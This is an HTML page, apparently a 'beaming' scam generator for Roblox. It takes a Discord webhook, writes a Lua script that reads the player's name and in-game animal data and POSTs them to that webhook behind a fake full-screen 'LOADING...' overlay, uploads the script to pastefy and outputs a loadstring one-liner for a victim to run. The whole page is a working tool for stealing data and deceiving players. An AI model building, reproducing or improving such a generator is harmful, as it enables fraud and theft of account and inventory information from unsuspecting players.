<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beanz Gen V3</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 0 20px #0f0; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; }
        #output { margin-top: 15px; padding: 10px; border: 1px dashed #0f0; display: none; word-break: break-all; font-size: 12px; background: #050505; }
    </style>
</head>
<body>
    <div class="card">
        <h2>BEANZ GEN V3</h2>
        <input type="text" id="webhook" placeholder="Paste Discord Webhook">
        <button id="btn" onclick="run()">GENERATE SCRIPT</button>
        <div id="status">Status: Idle</div>
        <div id="output"></div>
    </div>

    <script>
        async function run() {
            const web = document.getElementById('webhook').value;
            const status = document.getElementById('status');
            const output = document.getElementById('output');
            const btn = document.getElementById('btn');

            if(!web.includes("discord")) return alert("Invalid Webhook");

            btn.disabled = true;
            status.innerText = "Status: Uploading...";

            const lua = `local WEBHOOK_URL = "${web}"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local function send(link)
    local d = {}
    local deb = Workspace:FindFirstChild("Debris")
    if deb then
        for _, t in ipairs(deb:GetChildren()) do
            if t.Name == "FastOverheadTemplate" then
                local ov = t:FindFirstChild("AnimalOverhead")
                if ov then
                    local n = ov:FindFirstChild("DisplayName")
                    local g = ov:FindFirstChild("Generation")
                    if n and g then table.insert(d, n.Text .. " (" .. g.Text .. ")") end
                end
            end
        end
    end
    local s = table.concat(d, "\\n")
    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape", ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None") .. "\\\`\\\`\\\`"}}}} }
    local r = syn and syn.request or http and http.request or http_request or request
    if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
end

local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 1, 0)
f.BackgroundColor3 = Color3.new(0,0,0)
local l = Instance.new("TextLabel", f)
l.Size = UDim2.new(1,0,1,0)
l.Text = "LOADING..."
l.TextColor3 = Color3.new(1,1,1)

task.wait(2)
send("Join Link")`;

            try {
                // Using a different method to avoid the Connection Error
                const res = await fetch('https://api.pastefy.app/v2/paste', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ title: "Script", content: lua, type: "LUA" })
                });

                const data = await res.json();
                if(data.success) {
                    status.innerText = "Status: Done!";
                    output.innerText = 'loadstring(game:HttpGet("https://pastefy.app/' + data.paste.id + '/raw"))()';
                    output.style.display = "block";
                } else {
                    status.innerText = "Status: Pastefy is busy, try again.";
                }
            } catch (e) {
                // If it fails, we show a manual option
                status.innerText = "Status: Use manual mode below";
                output.innerText = "Error? Make sure your internet is stable and try again in 10 seconds.";
                output.style.display = "block";
            }
            btn.disabled = false;
        }
    </script>
</body>
</html>
